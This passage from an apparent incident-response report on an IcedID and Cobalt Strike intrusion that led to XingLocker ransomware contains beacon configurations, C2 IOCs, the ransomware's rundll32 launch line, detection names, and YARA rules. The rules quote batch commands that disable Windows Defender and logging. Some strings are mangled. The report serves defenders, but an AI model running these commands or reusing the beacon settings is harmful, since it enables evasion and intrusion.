21 bytes from the end\",\n    \"Remove 66 bytes from the beginning\",\n    \"Base64 decode\"\n  ],\n  \"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"HttpGet_Verb\": \"GET\",\n  \"HttpPost_Verb\": \"POST\",\n  \"HttpPostChunk\": 0,\n  \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe\",\n  \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe\",\n  \"CryptoScheme\": 0,\n  \"Proxy_Behavior\": \"Use IE settings\",\n  \"Watermark\": 0,\n  \"bStageCleanup\": \"False\",\n  \"bCFGCaution\": \"False\",\n  \"KillDate\": 0,\n  \"bProcInject_StartRWX\": \"True\",\n  \"bProcInject_UseRWX\": \"True\",\n  \"bProcInject_MinAllocSize\": 16384,\n  \"ProcInject_PrependAppend_x86\": [\n    \"kJA=\",\n    \"Empty\"\n  ],\n  \"ProcInject_PrependAppend_x64\": \"Empty\",\n  \"ProcInject_Execute\": [\n    \"ntdll.dll:RtlUserThreadStart\",\n    \"SetThreadContext\",\n    \"RtlCreateUserThread\"\n  ],\n  \"ProcInject_AllocationMethod\": \"VirtualAllocEx\",\n  \"bUsesCookies\": \"False\",\n  \"HostHeader\": \"\"}\ncroperdate.com (146.70.24.133:443) - This Cobalt Strike server was added to\nour Threat Feed on 07/27/2021.\n\n```\n\n-----\n\n```\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:ae4edc6faf64d08308082ad26be60767\nCertificate: [32:c6:10:53:d8:b9:78:25:57:24:fc:d0:a3:13:a1:02:fe:5a:69:e9]\nNot Before: 2021/07/27 10:49:01 UTC \nNot After: 2021/10/25 10:48:59 UTC \nIssuer Org: Let's Encrypt \nSubject Common: croperdate.com [croperdate.com ]\nPublic Algorithm: rsaEncryption\n\"x64\": {\n  \"md5\": \"e830976cb63c0741f77d03e2380be20f\",\n  \"sha256\": \"83b06b64509af99fb9c467149b00f1110249762f8afe611e37f60958e074d1ba\",\n  \"config\": {\n   \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n   \"Method 2\": \"POST\",\n   \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n   \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n   \"Method 1\": \"GET\",\n   \"Jitter\": 37,\n   \"C2 Server\": \"croperdate.com,/jquery-3.3.1.min.js\",\n   \"Beacon Type\": \"8 (HTTPS)\",\n   \"Port\": 443,\n   \"Polling\": 5000\n  },\n  \"time\": 1627388580602.7,\n  \"sha1\": \"b3cd1f976ed13ec2bc0abeef7ecea309c0c5461c\"\n },\n \"x86\": {\n  \"md5\": \"a5449d92756386dd749a8013d5267f14\",\n  \"sha256\": \"8da83bde3f4e7643a30ab818093981acef7e8870080db60a98286a1d9624dda1\",\n  \"config\": {\n   \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n   \"Method 2\": \"POST\",\n   \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n   \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n   \"Method 1\": \"GET\",\n   \"Jitter\": 37,\n   \"C2 Server\": \"croperdate.com,/jquery-3.3.1.min.js\",\n   \"Beacon Type\": \"8 (HTTPS)\",\n   \"Port\": 443,\n   \"Polling\": 5000\n  },\n  \"time\": 1627388577368.7,\n  \"sha1\": \"25a797d4679c40c1599949356cec9e350fdd5588\"\n }\n\n### Exfiltration\n\n#### No exfiltration TTPs were observed while analyzing this intrusion, however, as stated in the case summary, it is possible that the threat actors used Cobalt Strike (encrypted channel) to transmit sensitive data such as Word documents.\n\n### Impact\n\n```\n\n-----\n\n#### The ransomware was executed on multiple servers using a batch script start.bat :\n```\n@echo off\nrundll32 c:\\users\\public\\music\\update64.dll,start\n\n Here is the first ransomware execution which was observed on the Domain Controller:\n\n Below is another example of the ransomware execution on one of the external servers:\n\n Once the encryption process was complete a file called RecoveryManual.html was left across the filesystem with the instructions on how to contact the threat actors for the ransom negotiations.\n\n```\n\n-----\n\n### IOCs\n\n#### Network\n```\nIcedID C2\n37.120.222.100\n176.97.64.194 calseled.bond\n176.97.64.194 riderskop.top \nfeedbackfileweb.club\n5.61.46.161 gsterangsic.buzz\nCobalt Strike C2\n146.70.24.133 croperdate.com\n146.70.24.186  kaslose.com\n134.195.90.187 cdnsharepoi.xyz\n134.195.90.187 cdngithub.xyz\n134.195.90.187 cdnwindow.xyz\n134.195.90.187 cdnchrome.xyz\n134.195.90.187 cdnwin.xyz\n134.195.90.186 cdnwin.xyz\n134.195.90.185 cdnwin.xyz\n\n File\n\n```\n\n-----\n\n```\n0B330A76.bat\n348cae913e496198548854f5ff2f6d1e\na07655b9020205bd47084afd62a8bb22b48c0cdc\nc80128f51871eec3ae2057989a025ce244277c1c180498a5aaef45d5214b8506\nadf.bat\nc0fba1bdf26fdea254f29d035cfcb240\n76e49a572c2b468ff75387d340b871799fb514c0\n9a07559dd43d8defa9addf1d61d401cdecc121c3fd03789905c086875cbb918c\ncroperdate64.dll\n67c916ed405a3163d19f7642734d94be\n6f0edb57f316fd75a96c1365e7408cc51b165c1a\n1b981b4f1801c31551d20a0a5aee7548ec169d7af5dbcee549aa803aeea461a0\nfed1.bat\nb849c3fde795b901244033039b8ac7fc\n82226be6991b327a88f2e34d306e85fef3dc1a7c\n81a1247465ed4b6a44bd5b81437024469147b75fe4cb16dc4d2f7b912463bf12\nfed2.bat\n450319cd558fb091de5c1eb477279491\nb9be7387ad2363f240d6f9758565310bc070c5d8\nbf908d50760e3724ed5faa29b2a96cb1c8fc7a39b58c3853598d8b1ccfd424ac\nfed3.bat\nd66e39105b8c13e530e3965f058d74e1\nc94d92056db72aeac6d5c37e8f87b7be63065b25\n8dced0ed6cba8f97c0b01f59e063df6be8214a1bd510e4774ef7f30c78875f4e\nkaslose.dll\n922451995226138f5924a830e58dcf84\n05036842cc0faf1fe3c539e984af4ca96fb4478b\n320296ea54f7e957f4fc8d78ec0c1658d1c04a22110f9ddffa6e5cb633a1679c\nkaslose64.dll\n71d852063d97be95b841244ba2baa3b3\n1640828e4158ca867e35c4c2bd75fc7d2c32e82b\na4d92718e0a2e145d014737248044a7e11fb4fd45b683fcf7aabffeefa280413\nkasper.bat\nf72cab42a2ecb753e9cf1eca0fda9b75\nb0a303a9c5844aad78deafaa469f091d0fe78884\nfc2ab02ff0774921f49a1f78782a9c2634bacc76c149d5d16ab861ca9ce5d760\nspoolsv.exe\nbac8f1ac15380266049c693093350710\nef7ec279ef8bdca900f1190db945ad3f15d4f983\n0d575c22dfd30ca58f86e4cf3346180f2a841d2105a3dacfe298f9c7a22049a0\nstar.bat\nedc09807da2d733262c29f0fb184c6c2\n70dd6c21d031db5051a3635b8860c3a494c866ff\n6679848b93987eb8ca02f881e3542b9f54163264b18a13175b65e18ba711c905\nupdate64.dll\nffd1027dad6ba3eec0a8de67f9236d05\n61707322b2f5bb49dff51520fb0f9da866987153\n47ff886d229a013d6e73d660a395f7b8e285342195680083eb96d64c052dd5f0\n\n### Detections\n\n#### Network\n\n Suricata\n\n```\n\n-----\n\n```\nET MALWARE Win32/IcedID Request Cookie\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\nET DNS Query to a *.top domain - Likely Hostile\nThreatFox TrickBot botnet C2 traffic (ip:port - confidence level: 75%)\nETPRO POLICY Observed Atera Remote Access Application Activity Domain in TLS SNI\nET INFO Observed Let's Encrypt Certificate for Suspicious TLD (.xyz)\nThreatFox IcedID botnet C2 traffic (ip:port - confidence level: 75%)\nFeodo Tracker: potential TrickBot CnC Traffic detected\nET TROJAN Trickbot Checkin Response\nET INFO Dotted Quad Host DLL Request\nET INFO Suspicious Windows Commands in POST Body (ipconfig)\nET INFO Suspicious Windows Commands in POST Body (net config)\nET INFO Suspicious Windows Commands in POST Body (net view)\nET INFO Suspicious Windows Commands in POST Body (nltest)\nET POLICY IP Check Domain (icanhazip. com in HTTP Host)\nET POLICY PE EXE or DLL Windows file download HTTP\nET TROJAN Win32/IcedID Request Cookie\nET TROJAN Win32/Trickbot Data Exfiltration\n\n#### Sigma\n\n Abused Debug Privilege by Arbitrary Parent Processes – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/sysmon_abusing_debug_privilege.yml\n\n Automated Collection Command Prompt – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/process_cre ation_automated_collection.yml\n\n Bad Opsec Powershell Code Artifacts – https://github.com/SigmaHQ/sigma/blob/5e35e387dd0dcdd564db7077da3470fbc070b975/rul es/windows/powershell/powershell_bad_opsec_artifacts.yml\n\n Bloodhound and Sharphound Hack Tool – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_hack_b loodhound.yml\n\n CobaltStrike Process Patterns – https://github.com/SigmaHQ/sigma/blob/ee85fdfa3fda3d2861065f0e2f6a9d599b03e47e/rule s/windows/process_creation/win_cobaltstrike_process_patterns.yml\n\n CobaltStrike Service Installations – https://github.com/SigmaHQ/sigma/blob/1b480f2ee609e196fcaf6bfee11cf26133f64435/rules/ windows/builtin/win_cobaltstrike_service_installs.yml\n\n CobaltStrike Service Installations in Registry – https://github.com/SigmaHQ/sigma/blob/bbe67ddc73adaa245941fe240db4eff3279078a8/rul es/windows/registry_event/sysmon_cobaltstrike_service_installs.yml\n\n```\n\n-----\n\n#### Empire PowerShell Launch Parameters – https://github.com/SigmaHQ/sigma/blob/7c42a9d6cbe8af82b1df3cdde67b9adf9f86ffa1/rules/ windows/process_creation/win_susp_powershell_empire_launch.yml\n\n Execution from Suspicious Folder – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_execution_path.yml\n\n File Created with System Process Name – https://github.com/SigmaHQ/sigma/blob/ea430c8823803b9026a4e6e2ea7365dc5d96f385/rul es/windows/file_event/sysmon_creation_system_file.yml\n\n File or Folder Permissions Modifications – https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules /windows/process_creation/win_file_permission_modifications.yml\n\n First Time Seen Remote Named Pipe – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/builtin/win_lm_namedpipe.yml\n\n Local Accounts Discovery – https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules /windows/process_creation/win_local_system_owner_account_discovery.yml\n\n Malicious Base64 Encoded PowerShell Keywords in Command Lines – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_powershell_hidden_b64_cmd.yml\n\n Malicious PowerShell Commandlets – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/powershell/powershell_malicious_commandlets.yml\n\n Mimikatz Detection LSASS Access – https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/rul es/windows/deprecated/sysmon_mimikatz_detection_lsass.yml\n\n Net.exe Execution – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_net_execution.yml\n\n Non Interactive PowerShell – https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rule s/windows/process_creation/win_non_interactive_powershell.yml\n\n\n-----\n\n#### PowerShell as a Service in Registry – https://github.com/SigmaHQ/sigma/blob/a80c29a7c2e2e500a1a532db2a2a8bd69bd4a63d/r ules/windows/registry_event/sysmon_powershell_as_service.yml\n\n PowerShell Execution – https://github.com/SigmaHQ/sigma/blob/8aabb58eca06cc44ae21ae4d091793d8c5ca6a23/ru les/windows/image_load/sysmon_powershell_execution_moduleload.yml\n\n PowerShell Network Connections – https://github.com/SigmaHQ/sigma/blob/7f071d785157dfe185d845fad994aa6ec05ac678/rule s/windows/network_connection/sysmon_powershell_network_connection.yml\n\n PowerShell Scripts Installed as Services – https://github.com/SigmaHQ/sigma/blob/a80c29a7c2e2e500a1a532db2a2a8bd69bd4a63d/r ules/windows/builtin/win_powershell_script_installed_as_service.yml\n\n Rare Scheduled Task Creations – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/other/win_rare_schtask_creation.yml\n\n Rare Service Installs – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/builtin/win_rare_service_installs.yml\n\n Regsvr32 Anomaly – https://github.com/SigmaHQ/sigma/blob/6fbce11094285e5ba13fe101b9cb70f5b1ece198/rule s/windows/process_creation/win_susp_regsvr32_anomalies.yml\n\n Regsvr32 Command Line Without DLL – https://github.com/SigmaHQ/sigma/blob/7c42a9d6cbe8af82b1df3cdde67b9adf9f86ffa1/rules/ windows/process_creation/win_susp_regsvr32_no_dll.yml\n\n Regsvr32 Network Activity – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/network_connection/sysmon_regsvr32_network_activity.yml\n\n Rundll32 Internet Connection – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/network_connection/sysmon_rundll32_net_connections.yml\n\n Ryuk Ransomware – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_malware_ryuk.yml\n\n\n-----\n\n#### SMB Create Remote File Admin Share – https://github.com/SigmaHQ/sigma/blob/8beb70e970b814d0ab60625206ea0d8a21a9bff8/rul es/windows/builtin/win_smb_file_creation_admin_shares.yml\n\n Stop Windows Service – https://github.com/SigmaHQ/sigma/blob/eb406ba36fc607986970c09e53058af412093647/rul es/windows/process_creation/win_service_stop.yml\n\n Successful Overpass the Hash Attempt – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/builtin/win_overpass_the_hash.yml\n\n Suspicious AdFind Execution – https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_a dfind.yml\n\n Suspicious Encoded PowerShell Command Line – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_powershell_enc_cmd.yml\n\n Suspicious In-Memory Module Execution – https://github.com/SigmaHQ/sigma/blob/5cf7078fb3d61f2c15b01d9426f07f9197dd3db1/rules /windows/process_access/sysmon_in_memory_assembly_execution.yml\n\n Suspicious PowerShell Cmdline – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/powershell/powershell_cmdline_reversed_strings.yml\n\n Suspicious PowerShell Parent Process – https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rul es/windows/process_creation/win_susp_powershell_parent_process.yml\n\n Suspicious Spool Service Child Process – https://github.com/SigmaHQ/sigma/blob/0b83c12dd1fcc906ce705c413d5ed5db90ce5e82/rul es/windows/process_creation/win_susp_spoolsv_child_processes.yml\n\n Suspicious WMI Execution – https://github.com/SigmaHQ/sigma/blob/5e701a2bcb353338854c8ab47de616fe7e0e56ff/rule s/windows/process_creation/win_susp_wmi_execution.yml\n\n Windows Defender Threat Detection Disabled – https://github.com/SigmaHQ/sigma/blob/f69868b5aa25f33c629208d8868994ed24b20b46/rul es/windows/other/win_defender_disabled.yml\n\n\n-----\n\n#### Windows PowerShell Web Request – https://github.com/SigmaHQ/sigma/blob/9b7be5985ea6079e97a2a769404880fc9dd63994/ru les/windows/powershell/win_powershell_web_request.yml\n\n Yara\n\n\n-----\n\n```\n/                                          \n  YARA Rule Set                                   \n  Author: The DFIR Report                              \n  Date: 2021-10-10                                 \n  Identifier: 5582 Xinglocker                            \n  Reference: https://thedfirreport.com                       \n*/                                          \n/* Rule Set ----------------------------------------------------------------- */   \nimport \"pe\"                                     \nrule DLLBeacons {                                  \n  meta:                                       \n   description = \"for files: kaslose64.dll, spoolsv.exe, kaslose.dll,\ncroperdate64.dll\"                                  \n   author = \"TheDFIRReport\"                            \n   date = \"2021-09-14\"                              \n   hash1 = \"a4d92718e0a2e145d014737248044a7e11fb4fd45b683fcf7aabffeefa280413\"   \n   hash2 = \"0d575c22dfd30ca58f86e4cf3346180f2a841d2105a3dacfe298f9c7a22049a0\"   \n   hash3 = \"320296ea54f7e957f4fc8d78ec0c1658d1c04a22110f9ddffa6e5cb633a1679c\"   \n   hash4 = \"1b981b4f1801c31551d20a0a5aee7548ec169d7af5dbcee549aa803aeea461a0\"   \n  strings:                                     \n   $s1 = \"f14m80.dll\" fullword ascii                       \n   $s2 = \"\\\\dxdiag.exe\" fullword ascii                      \n   $s3 = \"\\\\regedit.exe\" fullword ascii                      \n   $s4 = \"\\\\notepad.exe\" fullword ascii                      \n   $s5 = \"\\\\mmc.exe\" fullword ascii                        \n   $s6 = \"spawn::resuming thread %02d\" fullword ascii               \n   $s7 = \"xYYyQDllwAZFpV51\" fullword ascii\n   $s8 = \"thread [%d]: finished\" fullword ascii\n   $s9 = \"wmi: error initialize COM security\" fullword ascii\n   $s10 = \"error initializing COM\" fullword ascii\n   $s11 = \"spawn::first wait failed: 0x%04x\" fullword ascii\n   $s12 = \"wmi: connect to root\\\\cimv2 failed: 0x%08x\" fullword ascii\n   $s13 = \"jmPekFtanAOGET_5\" fullword ascii\n   $s14 = \"spawn::decrypted\" fullword ascii\n   $s15 = \"eQ_Jt_fIrCE85LW3\" fullword ascii\n   $s16 = \"dBfdWB3uu8sReye1\" fullword ascii\n   $s17 = \"qpp0WQSPyuCnCEm3\" fullword ascii\n   $s18 = \"zn9gkPgoo_dOORd3\" fullword ascii\n   $s19 = \"wmi: probaly running on sandbox\" fullword ascii\n   $s20 = \"spawn::finished\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )\n   ) or ( all of them )\n}\nrule fed3_fed2_4 {\n  meta:\n   description = \"for files: fed3.bat, fed2.bat\"\n   author = \"TheDFIRReport\"\n\n```\n\n-----\n\n```\n   date 2021 09 14 \n   hash1 = \"8dced0ed6cba8f97c0b01f59e063df6be8214a1bd510e4774ef7f30c78875f4e\"\n   hash2 = \"bf908d50760e3724ed5faa29b2a96cb1c8fc7a39b58c3853598d8b1ccfd424ac\"\n  strings:\n   $s1 = \"reg add\n\\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"0\\\" /f\" ascii\n   $s2 = \"reg add\n\\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"0\\\" /f\" fullword ascii\n   $s3 = \"reg delete \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\"\n/v \\\"Windows Defender\\\" /f\" fullword ascii\n   $s4 = \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s5 = \"reg delete \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\"\n/v \\\"WindowsDefender\\\" /f\" fullword ascii\n   $s6 = \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s7 = \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s8 = \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s9 = \"reg add\n\\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService\\\" /v \\\"Start\\\" /t\nREG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s10 = \"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv\\\" /v\n\\\"Start\\\" /t REG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s11 = \"reg delete\n\\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run\\\"\n /v \\\"Windows Defender\\\" /f\" fullword ascii\n   $s12 = \"rem 0 - Disable Logging\" fullword ascii\n   $s13 = \"rem Run \\\"Disable WD.bat\\\" again to disable WD services\" fullword ascii\n   $s14 = \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\ExploitGuard\\\\ExploitGuard\nMDM policy Refresh\\\" /Disable\" fullword ascii\n   $s15 = \"reg delete \\\"HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\"\nfullword ascii\n   $s16 = \"reg delete \\\"HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\" fullword\nascii\n   $s17 = \"reg delete \\\"HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\\" /f\"\nfullword ascii\n   $s18 = \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows\nDefender Scheduled Scan\\\" /Disable\" fullword ascii\n   $s19 = \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows\nDefender Cleanup\\\" /Disable\" fullword ascii\n   $s20 = \"schtasks /Change /TN \\\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows\nDefender Verification\\\" /Disable\" fullword ascii\n  condition:\n   ( uint16(0) == 0x6540 and filesize < 10KB and ( 8 of them )\n   ) or ( all of them )\n}\nrule fed3_fed1_5 {\n  meta:\n   description = \"for files: fed3.bat, fed1.bat\"\n   author = \"TheDFIRReport\"\n\n```\n\n-----\n\n```\n   date 2021 09 14 \n   hash1 = \"8dced0ed6cba8f97c0b01f59e063df6be8214a1bd510e4774ef7f30c78875f4e\"\n   hash2 = \"81a1247465ed4b6a44bd5b81437024469147b75fe4cb16dc4d2f7b912463bf12\"\n  strings:\n   $s1 = \"rem https://technet.microsoft.com/enus/itpro/powershell/windows/defender/set-mppreference\" fullword ascii\n   $s2 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\nDefender\\\\SpyNet\\\" /v \\\"SpynetReporting\\\" /t REG_DWORD /d \\\"0\\\" /f\" fullword ascii\n   $s3 = \"rem reg add\n\\\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService\\\" /v \\\"Start\\\" /t\nREG_DWORD /d \\\"4\\\" /f\" fullword ascii\n   $s4 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v\n\\\"DisableAntiSpyware\\\" /t REG_DWORD /d \\\"1\\\" /f\" fullword ascii\n   $s5 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\nDefender\\\\SpyNet\\\" /v \\\"SubmitSamplesConsent\\\" /t REG_DWORD /d \\\"0\\\" /f\" fullword\nascii\n   $s6 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\nDefender\\\\SpyNet\\\" /v \\\"DisableBlockAtFirstSeen\\\" /t REG_DWORD /d \\\"1\\\" /\" ascii\n   $s7 = \"rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!\" fullword\nascii\n   $s8 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableScanOnRealtimeEnable\\\" /t RE\" ascii\n   $s9 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableScanOnRealtimeEnable\\\" /t RE\" ascii\n   $s10 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableBehaviorMonitoring\\\" /t REG_\" ascii\n   $s11 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableBehaviorMonitoring\\\" /t REG_\" ascii\n   $s12 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableOnAccessProtection\\\" /t REG_\" ascii\n   $s13 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableRealtimeMonitoring\\\" /t REG_\" ascii\n   $s14 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableIOAVProtection\\\" /t REG_DWOR\" ascii\n   $s15 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableRealtimeMonitoring\\\" /t REG_\" ascii\n   $s16 = \"rem 1 - Disable Real-time protection\" fullword ascii\n   $s17 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\" /v\n\\\"DisableAntiVirus\\\" /t REG_DWORD /d \\\"1\\\" /f\" fullword ascii\n   $s18 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableOnAccessProtection\\\" /t REG_\" ascii\n   $s19 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\nDefender\\\\MpEngine\\\" /v \\\"MpEnablePus\\\" /t REG_DWORD /d \\\"0\\\" /f\" fullword ascii\n   $s20 = \"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\RealTime Protection\\\" /v \\\"DisableIOAVProtection\\\" /t REG_DWOR\" ascii\n  condition:\n   ( uint16(0) == 0x6540 and filesize < 10KB and ( 8 of them )\n   ) or ( all of them )\n}\nrule spoolsv_kaslose_7 {\n  meta:\n   description = \"for files: spoolsv.exe, kaslose.dll\"\n   author = \"TheDFIRReport\"\n\n```\n\n-----\n\n```\n   date 2021 09 14 \n   hash1 = \"0d575c22dfd30ca58f86e4cf3346180f2a841d2105a3dacfe298f9c7a22049a0\"\n   hash2 = \"320296ea54f7e957f4fc8d78ec0c1658d1c04a22110f9ddffa6e5cb633a1679c\"\n  strings:\n   $s1 = \"Protect End\" fullword ascii\n   $s2 = \"ctsTpiHgtme0JSV3\" fullword ascii\n   $s3 = \"Protect Begin\" fullword ascii\n   $s4 = \"pZs67CJpQCgMm8L4\" fullword ascii\n   $s5 = \"6V7e7z7\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )\n   ) or ( all of them )\n}\nrule xinglocker_update64 {\n  meta:\n   description = \"xinglocker - file update64.dll\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2021-10-07\"\n   hash1 = \"47ff886d229a013d6e73d660a395f7b8e285342195680083eb96d64c052dd5f0\"\n  strings:\n   $s1 = \">j=nAy;j;l;l;m;n;k;p;q;rFpFo;u;vBo;x;y<j<k<l<m<[email protected]\n<p<q<r<s<t<u<v<w<x<y=j=k=l=m=n=o=p=q=r=s=t=u=v=w=x=y>j>k>l>m>n>o>p>q>rCk>t>u>v\" ascii\n   $s2 = \"?lAu>wGmCkCl;p?nFkCyGy;mCl>oDx9sGxCxCyHr<t?\noHu<[email protected]=sClCkHvDtDuHn<[email protected]\n[email protected]>s>lBtFmEnFoBl>tFnBvElFuFv\" ascii\n   $s3 =\n\"HnGtDyEpExFjAmEoAoFkEyEkEoEyAqAvErFpExFwFrFvFpFjBoEyFrEwEuBtFyFwEsFyBmGjCoCwDnCtCsCsC\n ascii\n   $s4 = \"[email protected];vDqBoEpCoCp>qGvCrBq?s>oCwCxGm<[email protected]\n<[email protected]>[email protected]>oFtDyDyEj=l?\nqEyEpEoEpEq<y=yElEuExEwExEuFjFkCqEnBr>x:kBy>oEv:oDsFv\" ascii\n   $s5 = \"BwBx;pCmCkClCm=vAkCnCqCr;l?vGm;[email protected]@[email protected]\n<y>kGxHq=u:rAt=xFk<[email protected];p<oFkFkFlGj9pBs>uFlHo;n;o;nBj\" ascii\n   $s6 = \"Bo>wGl9j9qGlGmGnBkEmFn<tCk?k;[email protected];s:[email protected]\n<n=rAt:qDwGl9o9pGy<kFlHoHn=nApFs=qBuFtHt9oHsGtGs>uBmFt>lBp9s\" ascii\n   $s7 = \":oFoFlFj?k?l?m;[email protected]<[email protected]?k;\n[email protected]@[email protected]<[email protected]<nHnGp>\n[email protected]@[email protected]?sEtFmEvFjExEvExEy>j>rFw:w>mFj:jElBmFn\" ascii\n   $s8 = \"FpDxFq?k=kCnGy;sCj:w>t>q>pGpCr?nGk;qFuBnBsAk?\nkHj<[email protected]=nCsAkHkDyEjAs=uAn<nAw=m9qDvCk<o9wAn=x9sAy>m;yFjCk>oBw>uCtErBk>k9\n ascii\n   $s9 = \"FwFxBqEu;p>u:v:u:t:sCyFm;rBw<r?yBpExGyAo;\n[email 